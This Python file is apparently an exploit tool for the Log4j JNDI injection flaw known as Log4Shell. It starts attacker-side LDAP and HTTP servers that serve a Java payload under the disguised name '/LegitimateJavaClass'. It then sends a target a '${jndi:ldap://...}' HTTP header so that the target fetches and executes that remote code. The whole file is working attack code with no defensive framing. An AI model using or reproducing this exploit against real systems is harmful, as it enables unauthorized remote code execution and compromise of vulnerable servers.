import multiprocessing
import requests

from handlers import LDAB, HTTB


class Attack:
    def __init__(self, target_url, lhost, java_payload, ldap_port="42063", http_port="42080"):
        self.target_url = target_url
        self.lhost = lhost
        self.ldap_port = ldap_port
        self.http_port = http_port
        self.query_name = "/LegitimateJavaClass"
        self.java_payload = java_payload

    def ldap_runner(self):
        print("starting ldap on {}".format(self.ldap_port))
        LDAB(self.lhost, self.ldap_port, self.query_name, self.http_port, self.java_payload)

    def http_runner(self):
        print("starting http on {}".format(self.http_port))
        HTTB(self.lhost, self.http_port, self.java_payload)

    def server_processes(self):
        self.ldap_process = multiprocessing.Process(target=self.ldap_runner)
        self.ldap_process.start()
        self.http_process = multiprocessing.Process(target=self.http_runner)
        self.http_process.start()

    def kill_server_processes(self):
        print("exiting")
        self.ldap_process.kill()
        self.http_process.kill()

    def trigger_vulnerability(self):
        raise NotImplementedError()


class AttackWithHTTPHeader(Attack):

    def trigger_vulnerability(self, header_name):
        headers = {header_name: "${jndi:ldap://{LHOST}:{LPORT}{query_name}}".replace("{LHOST}", self.lhost).replace("{LPORT}", self.ldap_port).replace("{query_name}", self.query_name)}
        requests.get(self.target_url, headers=headers)

    def attack(self, header_name):
        print("attacking")
        self.server_processes()
        self.trigger_vulnerability(header_name)
        self.kill_server_processes()

class HTTPShotgun(Attack):
    pass